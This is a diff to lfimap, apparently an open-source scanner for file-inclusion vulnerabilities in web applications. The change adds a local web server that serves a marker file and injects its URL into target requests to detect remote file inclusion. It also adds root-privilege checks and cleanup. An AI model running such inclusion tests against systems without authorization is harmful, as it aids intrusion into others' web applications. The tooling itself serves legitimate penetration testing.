@@ -5,20 +5,42 @@ import sys
 import re
 import socket
 import subprocess
+import time
 import random
 import argparse
 import requests
 import requests.exceptions
 import threading
-import time
 import http.client
+import http.server
+import socketserver
 
-from http.server import HTTPServer, SimpleHTTPRequestHandler
 from argparse import RawTextHelpFormatter
-
 
 exploits = []
 proxies = {}
+
+class ServerHandler(http.server.SimpleHTTPRequestHandler):
+    def log_message(self, format, *args):
+        pass
+
+def serve_forever():
+    socketserver.TCPServer.allow_reuse_address = True
+    
+    with socketserver.TCPServer(("", 8801), ServerHandler) as httpd:
+
+        if(args.verbose):
+            print("[i] Opening local web server and setting up 'rfitest.txt' that will be used as test inclusion")
+
+        tempf = open("rfitest.txt", "w")
+        tempf.write("961bb08a95dbc34397248d92352da799")
+        tempf.close()
+        
+        try:
+            httpd.serve_forever()
+        except:
+            httpd.server_close()
+            raise
 
 def prepareHeaders():
     user_agents = [
@@ -301,6 +323,20 @@ def test_php_expect(url):
 def test_rfi(url):
     if(args.verbose):
         print("Testing for RFI ...")
+    
+    #Localhost RFI test
+    if(args.lhost):
+        try:
+            threading.Thread(target=serve_forever).start()
+            
+            u = url.replace('PWN', "http://{0}:8801/rfitest.txt".format(args.lhost))
+            res = requests.get(u, headers = headers, proxies = proxies)
+
+            if(checkPayload(res)):
+                getExploit(res, 'GET', 'RFI', u, '', headers, 'RFI', '')
+                print("[+] RFI -> "+ u)
+        except:
+            pass
 
     #Internet RFI test
     if("PWN" in url):
@@ -627,7 +663,13 @@ def exploit(exploits, method):
             #u = url.replace('TMP', 'http://' + ip + ":" + port + "/")
             #res = requests.get(u, headers = headers, proxies = proxies)
             pass
-                
+     
+def lfimap_cleanup():
+    if(os.path.exists("rfitest.txt")):
+        os.remove("rfitest.txt")
+
+    os._exit(0)
+
 def main():
     global exploits
     global proxies
@@ -646,7 +688,7 @@ def main():
         test_wordlist(url)
         
         print("Done.")
-        sys.exit(0)
+        lfimap_cleanup()
 
     default = True
     if(args.wordlist):
@@ -677,7 +719,8 @@ def main():
         test_rfi(url)
 
     print("Done.")
-    sys.exit(0)
+
+    lfimap_cleanup()
 
 if(__name__ == "__main__"):
     
@@ -760,17 +803,22 @@ if(__name__ == "__main__"):
     
     #Warning if cookie is not provided
     if(not args.cookie):
-        print("WARNING: Cookie argument ('-c') is not provided. lfimap might have troubles finding vulnerabilities if web app requires a cookie.\n")
+        print("[!]WARNING: Cookie argument ('-c') is not provided. lfimap might have troubles finding vulnerabilities if web app requires a cookie.\n")
         time.sleep(2)
 
-    if(args.rfi):
-        print("WARNING: RFI test is done assuming target is connected to the internet...")
-        time.sleep(1)
-
+    if(args.rfi and args.lhost):
+        if(os.getuid() != 0):
+            print("[-] Cannot run LHOST file inclusion test as non admin user. Please run lfimap as admin/root. Exiting...")
+            sys.exit()
     
+    if(args.test_all):
+        if(os.getuid() != 0):
+            print("[-] Please run lfimap as admin/root for all tests. Exiting...")
+            sys.exit()
+
     #Everything is OK, preparing http request headers
     headers = prepareHeaders()
     if(args.cookie is not None):
         addHeader('Cookie', args.cookie)
-    
+        
     main()
